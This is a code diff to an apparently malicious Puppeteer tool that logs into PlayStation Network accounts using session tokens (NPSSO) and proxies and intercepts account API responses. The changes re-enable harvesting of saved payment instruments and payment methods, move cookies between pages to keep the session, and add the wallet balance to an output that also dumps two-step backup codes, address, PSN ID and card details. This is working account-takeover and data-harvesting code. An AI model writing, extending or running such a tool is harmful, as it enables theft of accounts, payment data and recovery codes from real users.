@@ -15,7 +15,7 @@ const CONSTANTS = {
         "https://accounts.api.playstation.com/api/v1/accounts/me/communication",
         /\/twostepbackupcodes$/,
         "https://accounts.api.playstation.com/api/v1/accounts/me/addresses",
-        // "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
+        "https://web.np.playstation.com/api/graphql/v2/transact/wallets/savedInstruments",
         'https://web.np.playstation.com/api/graphql/v1//op?operationName=getUserSubscriptions'
     ],
     PAGE_CONFIGS: {
@@ -29,7 +29,7 @@ const CONSTANTS = {
             name: "page2",
             waitTime: 5000,
         },
-       // API_URL: "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
+       API_URL: "https://web.np.playstation.com/api/graphql/v2/transact/wallets/paymentMethods?tenant=PSN",
     },
     XPATHS: {
         ERROR: "/html/body/div[3]/div/div[2]/div/div/div/div/div[4]/div/div[1]",
@@ -478,7 +478,7 @@ async function runPsnApiTool(options) {
 
     const browserOptions = {
         // executablePath: "/home/majid/Documents/chrome-linux/chrome",
-        headless: 'new',
+        headless: false,
         defaultViewport: { width: 1920, height: 1080 },
         args: [
             "--no-sandbox", "--disable-setuid-sandbox", "--window-size=1920,1080",
@@ -497,7 +497,17 @@ async function runPsnApiTool(options) {
         logProgress("Starting browser...", onProgress);
         browser = await puppeteer.launch(browserOptions);
 
-        // Set up first page
+        // Set up second page first - open it twice
+        let page2 = await createConfiguredPage(
+            browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
+            CONSTANTS.PAGE_CONFIGS.SECOND.name, onProgress, onData, proxyConfig
+        );
+        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page (first load)", onProgress);
+        await waitWithLog(2000, "for second page to load", onProgress);
+        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page (second load)", onProgress);
+        await waitWithLog(2000, "for second page reload", onProgress);
+
+        // Set up first page and do its work
         let page1 = await createConfiguredPage(
             browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
             CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
@@ -602,15 +612,6 @@ async function runPsnApiTool(options) {
             logProgress(`Error while trying to click element: ${error.message}`, onProgress);
         }
 
-        // Set up second page
-        const page2 = await createConfiguredPage(
-            browser, cookies, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
-            CONSTANTS.PAGE_CONFIGS.SECOND.name, onProgress, onData, proxyConfig
-        );
-        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page", onProgress);
-        await waitWithLog(2000, "before reloading second page", onProgress);
-        await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page (Reload 1)", onProgress);
-
         // Check PS Plus and click buttons
         if (finalResponses.profile?.isPsPlusMember) {
             await page1.waitForXPath(CONSTANTS.XPATHS.PS_PLUS_1, { timeout: CONSTANTS.TIMEOUTS.EXTRA_LONG });
@@ -634,6 +635,14 @@ async function runPsnApiTool(options) {
             logProgress("Click successful.", onProgress);
             logProgress(`Button found, clicking...`, onProgress);
             await waitWithLog(3000, "processing", onProgress);
+        }
+
+        // Return to second page and reload with cookies from first page
+        if (cookies && cookies.length > 0) {
+            logProgress(`Returning to page2 and updating with ${cookies.length} cookies from page1...`, onProgress);
+            await Promise.all(cookies.map(cookie => page2.setCookie(cookie)));
+            await waitWithLog(2000, "before reloading second page with cookies", onProgress);
+            await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "second page (final reload with cookies)", onProgress);
         }
 
         // Get final cookies
@@ -669,7 +678,6 @@ async function runPsnApiTool(options) {
                     : false;
                 const countryCode = finalResponses.address?.country || null;
 
-                // - Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount} ${finalResponses.wallets?.currencyCode || ""}
 
                 // Create final output
                 const output = `
@@ -679,6 +687,7 @@ async function runPsnApiTool(options) {
 - Backup Codes : [ ${finalResponses.backupCodes ? finalResponses.backupCodes.join(" - ") : "N/A"} ]
 --------------------------- « Details » --------------------------
 - Country | City | Postal Code : ${countryCode ? (countries.find(item => item.code === countryCode)).name : "N/A"} - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"}
+- Balance : ${finalResponses.wallets?.debtBalance}.${finalResponses.wallets?.currentAmount} ${finalResponses.wallets?.currencyCode || ""}
 - PSN ID : ${finalResponses.profile?.onlineId || "N/A"}
 - Payments : ${finalResponses.creditCards || "Not Found"} 
 - PS Plus : ${finalResponses.profile?.isPsPlusMember ? `Yes! - ${finalResponses.plusTitle} | ${finalResponses.plusExpireDate}` : "No!"}
